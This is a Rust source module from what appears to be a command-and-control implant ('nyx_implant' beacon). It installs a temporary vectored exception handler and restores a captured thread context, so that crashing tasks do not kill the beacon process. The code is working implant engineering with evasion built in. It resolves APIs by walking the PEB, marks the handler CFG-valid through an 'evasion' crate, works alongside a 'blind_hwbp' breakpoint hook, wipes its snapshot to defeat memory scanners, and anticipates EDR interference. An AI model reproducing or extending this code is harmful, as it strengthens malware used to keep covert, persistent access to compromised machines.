//! VEH task guard (WP-B1) — wraps one task's `execute()` in a temporary
//! vectored exception handler so a fatal fault in task code returns
//! `Response::Err("task crashed: 0x........")` instead of killing the beacon
//! process.
//!
//! ## Design (approved spec: docs/superpowers/specs/2026-08-04-v040-beacon-isolation-crate-split-design.md)
//! - **Chain tail (First=0).** The guard registers at the END of the VEH
//!   chain so every other handler — above all `blind_hwbp`'s First=1 HWBP
//!   handler — sees the exception first. HWBP's `STATUS_SINGLE_STEP` (#DB)
//!   traffic is none of our business: the guard hard-passes it (and every
//!   non-allowlisted code) with `EXCEPTION_CONTINUE_SEARCH`.
//! - **Fatal allowlist only.** AV (0xC0000005), ILLEGAL_INSTRUCTION
//!   (0xC000001D), STACK_OVERFLOW (0xC00000FD). Everything else — including
//!   any exception with nonzero ExceptionFlags (noncontinuable) and fail-fast
//!   codes like 0xC0000409 — keeps searching and stays fatal. Restoring on a
//!   #DB would resume into the same trap; restoring a noncontinuable
//!   exception is illegal (the OS re-raises).
//! - **Temporary registration.** The guard is added immediately before the
//!   task runs and removed immediately after; it is never resident. The
//!   bootstrap-time `veh_chain_has_handlers` probe runs once before any task
//!   (register_veh_once), so a per-task tail guard cannot influence it, and a
//!   resident guard would be chain-surface drift beyond the spec. A per-task
//!   registration failure degrades to UNGUARDED execution — the guard never
//!   touches `blind_hwbp`'s `VEH_SAFE` latch (that means "chain unsafe at
//!   boot", not "one task couldn't be wrapped").
//! - **Snapshot + resume.** Before the task runs, `RtlCaptureContext`
//!   captures the beacon thread into a dedicated static slot (1232-byte x64
//!   CONTEXT). On a matched fault the handler copies the snapshot's
//!   control+callee-saved fields into the OS-provided CONTEXT and returns
//!   `EXCEPTION_CONTINUE_EXECUTION`; the thread resumes at the instruction
//!   after the capture call, observes STATE==CRASHED, and `run` returns the
//!   Err sentinel. An `AtomicU8` (EMPTY/ARMED/CRASHED) keeps the handler
//!   lock-free and fail-stop: a fault observed while not ARMED keeps
//!   searching, so a second fault on the recovery path is fatal by design —
//!   no restore loop.
//! - **Bounded leak, by design.** Resuming at the capture point abandons the
//!   faulted task's stack frames; their destructors never run (sacrificial
//!   processes, pipe handles, section objects leak). Accepted and bounded per
//!   crash event — replaying destructors from a faulted state is unsound, and
//!   WP-B2 removes the crash sources themselves.
//! - **Future task-internal VEHs** must register First=1 (head) so they
//!   preempt the guard for their own faults, and must pass SINGLE_STEP and
//!   non-fatal codes down the chain.
//! - **Non-reentrant** by the crate-wide single-beacon-thread invariant
//!   (hard constraint #3): one guarded task at a time.
//!
//! The handler itself is lock-free, allocation-free and syscall-free: raw
//! unaligned reads/writes only (precedent: `blind_hwbp::hwbp_veh_handler`).
//! It never touches DR6/DR7 — those belong to the HWBP handler.

#![cfg(target_os = "windows")]

use core::sync::atomic::{AtomicU32, AtomicU8, Ordering};
use nyx_implant_core::heap::{vec, String, Vec};
use nyx_protocol::Response;

// ---- Exception codes (WinNT.h / ntstatus.h) -------------------------------

/// STATUS_SINGLE_STEP (0x80000004) — hardware breakpoint / single-step.
/// Owned by `blind_hwbp`'s First=1 handler; the guard always passes it down.
const STATUS_SINGLE_STEP: i32 = 0x8000_0004u32 as i32;
/// STATUS_ACCESS_VIOLATION (0xC0000005) — wild read/write/execute. Allowlist.
const STATUS_ACCESS_VIOLATION: i32 = 0xC000_0005u32 as i32;
/// STATUS_ILLEGAL_INSTRUCTION (0xC000001D) — UD2/bad opcode. Allowlist.
const STATUS_ILLEGAL_INSTRUCTION: i32 = 0xC000_001Du32 as i32;
/// STATUS_STACK_OVERFLOW (0xC00000FD) — guard-page exhaustion. Allowlist.
const STATUS_STACK_OVERFLOW: i32 = 0xC000_00FDu32 as i32;

/// Return this from the VEH to keep walking the chain (blind_hwbp precedent).
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
/// Return this to apply the modified ContextRecord and resume there.
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;

/// CONTEXT_AMD64|CONTEXT_CONTROL|CONTEXT_INTEGER — declares what the restore
/// rewrote (WinNT.h AMD64: 0x100000|0x1|0x2). Deliberately NOT
/// CONTEXT_FLOATING_POINT (+0x4 → 0x10000B): the recovery path executes no
/// floating-point and the narrower mask limits the context surface the kernel
/// validates on resume.
const RESTORE_CONTEXT_FLAGS: u32 = 0x0010_0003;

/// EFLAGS Resume Flag (bit 16). Cleared on restore so a stale RF from the
/// snapshot can't single-step-skip the first instruction after resume.
const RF_BIT: u32 = 1 << 16;

// ---- x64 CONTEXT offsets (verified against WinNT.h _CONTEXT AMD64 — the
// same table as context.rs's module comment and blind_hwbp.rs's offset
// block; R15=0xF0 is anchored by blind_hwbp's CTX_RIP=0xF8 and context.rs's
// set_r9=0xC0/set_rip=0xF8 accessors) ----------------------------------------
//
//  0x030 ContextFlags   0x038 SegCs   0x042 SegSs   0x044 EFlags
//  0x048..0x070 Dr0..Dr7 (NEVER touched — the HWBP handler owns them)
//  0x078 Rax   0x080 Rcx   0x088 Rdx   0x090 Rbx
//  0x098 Rsp   0x0A0 Rbp   0x0A8 Rsi   0x0B0 Rdi
//  0x0B8 R8    0x0C0 R9    0x0C8 R10   0x0D0 R11
//  0x0D8 R12   0x0E0 R13   0x0E8 R14   0x0F0 R15   0x0F8 Rip
const CTX_CONTEXT_FLAGS: usize = 0x030;
const CTX_SEG_CS: usize = 0x038;
const CTX_SEG_SS: usize = 0x042;
const CTX_EFLAGS: usize = 0x044;
const CTX_RBX: usize = 0x090;
const CTX_RSP: usize = 0x098;
const CTX_RBP: usize = 0x0A0;
const CTX_RSI: usize = 0x0A8;
const CTX_RDI: usize = 0x0B0;
const CTX_R12: usize = 0x0D8;
const CTX_R13: usize = 0x0E0;
const CTX_R14: usize = 0x0E8;
const CTX_R15: usize = 0x0F0;
const CTX_RIP: usize = 0x0F8;

/// Callee-saved GPR + control fields copied snapshot→OS-CONTEXT on restore.
/// Win64 ABI: Rbx/Rbp/Rsi/Rdi/R12–R15/Rsp are non-volatile, so the resumed
/// `run` frame requires exactly them (plus Rip); volatile Rax/Rcx/Rdx/R8–R11
/// are assumed clobbered by the capture call and skipped.
const RESTORE_U64_FIELDS: [usize; 10] = [
    CTX_RBX, CTX_RSP, CTX_RBP, CTX_RSI, CTX_RDI, CTX_R12, CTX_R13, CTX_R14, CTX_R15, CTX_RIP,
];

// ---- State machine ----------------------------------------------------------

/// No snapshot / no armed task: the handler passes everything through.
const STATE_EMPTY: u8 = 0;
/// Snapshot captured, task running: the handler may restore a matched fault.
const STATE_ARMED: u8 = 1;
/// The handler matched a fault and restored; the resumed `run` reads this and
/// returns the Err sentinel instead of running the task closure.
const STATE_CRASHED: u8 = 2;

/// Guard state machine. Written by the beacon thread and by the VEH (same
/// thread); atomic for aliasing hygiene (CRITICAL-6 precedent: no `static mut`).
static STATE: AtomicU8 = AtomicU8::new(STATE_EMPTY);

/// Exception code of the fault that moved STATE to CRASHED. Written by the
/// handler before the CRASHED store (Release) so the resumed `run` (Acquire)
/// can format it into the Err sentinel. Zero-allocation, lock-free.
static CRASH_CODE: AtomicU32 = AtomicU32::new(0);

/// Dedicated snapshot slot: one full x64 CONTEXT (1232 B, 16-aligned) written
/// by RtlCaptureContext before each guarded task. `SyncCell` per the
/// single-beacon-thread contract (same pattern as mem.rs); the ARMED store is
/// Release and the handler's load is Acquire, ordering the capture's writes
/// before the handler's reads.
static SNAPSHOT: nyx_implant_core::cell::SyncCell<nyx_implant_core::context::Context> =
    nyx_implant_core::cell::SyncCell::new(nyx_implant_core::context::Context::zeroed());

/// One-shot latch: CFG marks are process-persistent and the handler address
/// is a static code address, so mark once instead of paying
/// SetProcessValidCallTargets on every task.
static CFG_MARKED: AtomicU8 = AtomicU8::new(0);

// ---- API resolution ---------------------------------------------------------

#[allow(clippy::type_complexity)]
struct GuardApis {
    add: unsafe extern "system" fn(
        usize,
        unsafe extern "system" fn(usize) -> i32,
    ) -> *mut core::ffi::c_void,
    remove: unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
    capture: unsafe extern "system" fn(usize),
}

/// Resolve the three APIs the guard needs. kernelbase→kernel32 fallback order
/// for the VEH pair (blind_hwbp.rs:709-747 precedent); RtlCaptureContext is a
/// kernel32 export (forwarded to ntdll on modern Windows — resolve.rs follows
/// forwarders) with ntdll as fallback. Unlike blind_hwbp's
/// `resolve_add_veh`/`resolve_remove_veh`, failure here does NOT latch
/// VEH_SAFE: the guard degrades to unguarded execution for this task only.
unsafe fn resolve_guard_apis() -> Option<GuardApis> {
    let add_addr =
        nyx_implant_core::resolve::export_addr(b"kernelbase.dll", b"AddVectoredExceptionHandler")
            .or_else(|| {
            nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"AddVectoredExceptionHandler")
        })?;
    let rm_addr = nyx_implant_core::resolve::export_addr(
        b"kernelbase.dll",
        b"RemoveVectoredExceptionHandler",
    )
    .or_else(|| {
        nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"RemoveVectoredExceptionHandler")
    })?;
    let cap_addr = nyx_implant_core::resolve::export_addr(b"kernel32.dll", b"RtlCaptureContext")
        .or_else(|| nyx_implant_core::resolve::export_addr(b"ntdll.dll", b"RtlCaptureContext"))?;
    // SAFETY: all three are usize export addresses of APIs whose exact
    // signatures match the GuardApis fn-pointer fields (documented Win32
    // prototypes; same transmute discipline as blind_hwbp.rs:726/746).
    Some(GuardApis {
        add: core::mem::transmute(add_addr),
        remove: core::mem::transmute(rm_addr),
        capture: core::mem::transmute(cap_addr),
    })
}

/// Mark `guard_handler` as a valid CFG indirect-call target. The VEH dispatch
/// list calls the handler indirectly; an unmarked handler fail-fasts with
/// 0xC0000409 on the FIRST dispatch (blind_hwbp.rs:883-887 precedent).
unsafe fn mark_handler_cfg() {
    if nyx_implant_evasion::cfg_user::cfg_enabled() {
        // SAFETY: guard_handler is a static code address inside the implant
        // image (committed private memory); mark_addr_cfg_valid is
        // best-effort and non-fatal when CFG is off.
        nyx_implant_evasion::cfg_user::mark_addr_cfg_valid(guard_handler as *const () as usize);
    }
}

// ---- Guard body -------------------------------------------------------------

/// Run `f` (one task's `execute()`) under the VEH guard. On any resolution or
/// registration failure the task runs UNGUARDED — the guard never blocks task
/// execution and never touches `blind_hwbp`'s VEH_SAFE latch.
///
/// Normal path: register (First=0 tail) → snapshot → ARMED → `f()` → remove →
/// EMPTY → return `f`'s responses unchanged.
///
/// Crash path: a matched fault makes the handler restore the snapshot into
/// the OS CONTEXT; the thread resumes at the instruction after the capture
/// call below, observes STATE==CRASHED, removes the registration, and returns
/// `vec![Response::Err("task crashed: 0x........")]`. The faulted task's
/// partially-built responses are abandoned (the `f()` call never returns) and
/// its frames/resources are the accepted bounded leak documented above.
pub(crate) fn run(f: impl FnOnce() -> Vec<Response>) -> Vec<Response> {
    let Some(apis) = (unsafe { resolve_guard_apis() }) else {
        return f(); // VEH/capture APIs unresolvable → unguarded (by design)
    };
    if CFG_MARKED.load(Ordering::Acquire) == 0 {
        // SAFETY: best-effort CFG marking; see mark_handler_cfg.
        unsafe { mark_handler_cfg() };
        CFG_MARKED.store(1, Ordering::Release);
    }
    // SAFETY: `apis.add` is the resolved AddVectoredExceptionHandler export
    // and guard_handler has the exact PVECTORED_EXCEPTION_HANDLER signature.
    // First=0 → chain TAIL (opposite of HWBP's First=1): every other handler
    // runs first, the guard only sees faults nobody else claimed.
    let handle = unsafe { (apis.add)(0, guard_handler) };
    if handle.is_null() {
        return f(); // AddVectoredExceptionHandler hooked/failed → unguarded
    }
    // Registration is live but STATE is still EMPTY, so any fault in this
    // pre-arm window passes through (fail-stop).
    let slot = SNAPSHOT.get();
    // SAFETY: `slot` points at the static 1232-byte Context; set_context_flags
    // writes the in-bounds DWORD at 0x30. CONTEXT_FULL (context.rs const,
    // verified 0x100007 = AMD64|CONTROL|INTEGER|FLOATING_POINT) asks for the
    // complete thread context, XMM state included.
    unsafe { (*slot).set_context_flags(nyx_implant_core::context::CONTEXT_FULL) };
    // SAFETY: `capture` is RtlCaptureContext; it fills the *caller's* context
    // into `slot`. The captured Rip is the return address into THIS frame —
    // the VEH restore resumes at the very next instruction, and the captured
    // Rsp/callee-saved registers reconstruct this frame exactly.
    unsafe { (apis.capture)(slot as usize) };
    if STATE.load(Ordering::Acquire) == STATE_CRASHED {
        // Resume point after a matched fault. Recovery is allocation-free up
        // to this check; a second fault inside this block is fail-stop
        // (STATE != ARMED → the handler keeps searching → unhandled).
        let code = CRASH_CODE.load(Ordering::Relaxed);
        // SAFETY: `apis.remove` is RemoveVectoredExceptionHandler and `handle`
        // is this run's live registration. The return value is best-effort:
        // if removal itself fails (EDR meddling) the handler stays resident
        // but inert — STATE != ARMED makes it an unconditional pass-through.
        unsafe { (apis.remove)(handle) };
        STATE.store(STATE_EMPTY, Ordering::Release);
        wipe_snapshot();
        return vec![Response::Err(crash_message(code))];
    }
    STATE.store(STATE_ARMED, Ordering::Release);
    let out = f();
    // SAFETY: see above — same live handle, best-effort removal.
    unsafe { (apis.remove)(handle) };
    STATE.store(STATE_EMPTY, Ordering::Release);
    wipe_snapshot();
    out
}

/// Zero the snapshot slot. Bounds the window where .bss holds a live beacon
/// stack pointer (the snapshot's Rsp) to a single task — a scanner reading
/// .bss between tasks finds zeros. Cheap: one 1232-byte memset per task.
fn wipe_snapshot() {
    // SAFETY: the slot is the static 1232-byte Context buffer (size asserted
    // in context.rs); written only while STATE != ARMED, i.e. the handler
    // cannot be mid-restore on this slot (single-threaded beacon).
    unsafe { core::ptr::write_bytes(SNAPSHOT.get() as *mut u8, 0, 0x4D0) };
}

/// Build the crash sentinel message. Allocation happens ONLY here — in the
/// resumed guard code after the VEH is removed — never inside the handler.
fn crash_message(code: u32) -> String {
    let mut s = String::from("task crashed: 0x");
    // Fixed 8-hex-digit rendering (no format! under no_std).
    for i in 0..8u32 {
        let nib = ((code >> (28 - i * 4)) & 0xF) as u8;
        s.push(
            (if nib < 10 {
                b'0' + nib
            } else {
                b'a' + (nib - 10)
            }) as char,
        );
    }
    s
}

// ---- VEH handler ------------------------------------------------------------

/// Vectored exception handler — chain tail (First=0). Lock-free, zero
/// allocation, zero syscalls: raw unaligned memory access only (precedents:
/// blind_hwbp.rs hwbp_veh_handler:466-495 + veh_parse_pointers:497-516).
///
/// Decision order (anything failing → EXCEPTION_CONTINUE_SEARCH):
///   1. null/foreign EXCEPTION_POINTERS → SEARCH
///   2. STATUS_SINGLE_STEP → SEARCH (HWBP's #DB traffic; restoring on a
///      single-step trap is wrong and re-fires it)
///   3. code not in the fatal allowlist → SEARCH (fail-fast 0xC0000409,
///      noncontinuable 0xC0000025, #DB, … stay fatal)
///   4. ExceptionFlags != 0 → SEARCH (EXCEPTION_NONCONTINUABLE: the OS
///      re-raises a continued noncontinuable exception — restore is illegal)
///   5. STATE != ARMED → SEARCH (fail-stop outside the task window and on
///      the CRASHED recovery path — no restore loop)
///   6. copy the snapshot's control+callee-saved block into the OS CONTEXT,
///      OR ContextFlags, return EXCEPTION_CONTINUE_EXECUTION.
///
/// # Safety
/// Called by the OS exception dispatcher on the faulting beacon thread with a
/// valid EXCEPTION_POINTERS pointer for the handler's duration. Never touches
/// DR6(0x68)/DR7(0x70) — those belong to blind_hwbp's handler.
unsafe extern "system" fn guard_handler(ep: usize) -> i32 {
    // 1. Parse EXCEPTION_POINTERS: [+0]=PEXCEPTION_RECORD, [+8]=PCONTEXT
    //    (veh_parse_pointers precedent, blind_hwbp.rs:497-516).
    if ep == 0 {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    let ep_ptr = ep as *const u8;
    // SAFETY: ep is the OS-delivered EXCEPTION_POINTERS; both pointer fields
    // are valid for the handler's duration.
    let exr = unsafe { core::ptr::read_unaligned(ep_ptr as *const usize) as *const u8 };
    let ctx = unsafe { core::ptr::read_unaligned(ep_ptr.add(8) as *const usize) as *mut u8 };
    if exr.is_null() || ctx.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // EXCEPTION_RECORD.ExceptionCode at +0x00 (i32), ExceptionFlags at +0x04.
    // SAFETY: exr points at a valid EXCEPTION_RECORD; these are its first two
    // DWORD fields.
    let code = unsafe { core::ptr::read_unaligned(exr as *const i32) };
    let flags = unsafe { core::ptr::read_unaligned(exr.add(4) as *const u32) };

    // 2. SINGLE_STEP always passes — the HWBP handler owns #DB; "recovering"
    //    a single-step as a task crash would resume into the same trap.
    if code == STATUS_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    // 3. Fatal allowlist only — everything else stays fatal by default.
    if code != STATUS_ACCESS_VIOLATION
        && code != STATUS_ILLEGAL_INSTRUCTION
        && code != STATUS_STACK_OVERFLOW
    {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    // 4. Any ExceptionFlags set (noncontinuable): continuing is illegal.
    if flags != 0 {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    // 5. Only restore while a task is armed. EMPTY (outside the task window)
    //    and CRASHED (recovery path) are both fail-stop.
    if STATE.load(Ordering::Acquire) != STATE_ARMED {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    // ---- Matched: publish the crash, then rewrite the OS CONTEXT. ----
    CRASH_CODE.store(code as u32, Ordering::Relaxed);
    STATE.store(STATE_CRASHED, Ordering::Release);

    let snap = SNAPSHOT.get() as usize;
    let ctxb = ctx as usize;
    for &off in RESTORE_U64_FIELDS.iter() {
        // SAFETY: `snap` is the static 1232-byte snapshot CONTEXT and `ctxb`
        // the OS-delivered CONTEXT; every offset in RESTORE_U64_FIELDS is an
        // in-bounds u64 field in both (WinNT.h table above). write_unaligned
        // tolerates any alignment (ctx_write_u64_at precedent,
        // blind_hwbp.rs:760-764). The ARMED Acquire load above orders the
        // capture's snapshot writes before these reads.
        let v = unsafe { core::ptr::read_unaligned((snap + off) as *const u64) };
        unsafe { core::ptr::write_unaligned((ctxb + off) as *mut u64, v) };
    }
    // EFlags: restore from the snapshot but clear RF so a stale resume flag
    // can't skip the first instruction (or mask a HWBP trigger) after resume.
    // SAFETY: 0x44 is the in-bounds EFlags DWORD in both buffers.
    let eflags = unsafe { core::ptr::read_unaligned((snap + CTX_EFLAGS) as *const u32) } & !RF_BIT;
    unsafe { core::ptr::write_unaligned((ctxb + CTX_EFLAGS) as *mut u32, eflags) };
    // Segments: x64 user-mode selectors are invariant (0x33 CS / 0x2B SS) and
    // RtlCaptureContext always fills them; resuming with SegCs/SegSs = 0
    // faults with #GP(0) (context.rs:207-212 documents this).
    // SAFETY: 0x38/0x42 are in-bounds WORD fields in both buffers.
    let cs = unsafe { core::ptr::read_unaligned((snap + CTX_SEG_CS) as *const u16) };
    let ss = unsafe { core::ptr::read_unaligned((snap + CTX_SEG_SS) as *const u16) };
    unsafe { core::ptr::write_unaligned((ctxb + CTX_SEG_CS) as *mut u16, cs) };
    unsafe { core::ptr::write_unaligned((ctxb + CTX_SEG_SS) as *mut u16, ss) };
    // ContextFlags: declare what was rewritten (CONTROL|INTEGER). DR6/DR7 and
    // the fault's own RF are never touched — blind_hwbp's handler owns them.
    // SAFETY: 0x30 is the in-bounds ContextFlags DWORD of the OS CONTEXT.
    let cf = unsafe { core::ptr::read_unaligned((ctxb + CTX_CONTEXT_FLAGS) as *const u32) };
    unsafe {
        core::ptr::write_unaligned(
            (ctxb + CTX_CONTEXT_FLAGS) as *mut u32,
            cf | RESTORE_CONTEXT_FLAGS,
        )
    };

    EXCEPTION_CONTINUE_EXECUTION
}

// ---- Selftest support ---------------------------------------------------------

/// Selftest support: true when the guard's three APIs resolve — i.e. the
/// crash-recovery bit CAN work in this environment. Environments without VEH
/// delivery (e.g. the Qiling stub rootfs, whose kernel32/ntdll stubs export
/// neither AddVectoredExceptionHandler nor RtlCaptureContext) resolve false
/// here, letting the selftest skip the deliberate-fault bit with a visible
/// flag instead of dying on an uncaught AV.
#[cfg(feature = "selftest")]
pub(crate) fn prereqs_available() -> bool {
    // SAFETY: resolution is a read-only PEB walk; nothing is called.
    unsafe { resolve_guard_apis().is_some() }
}
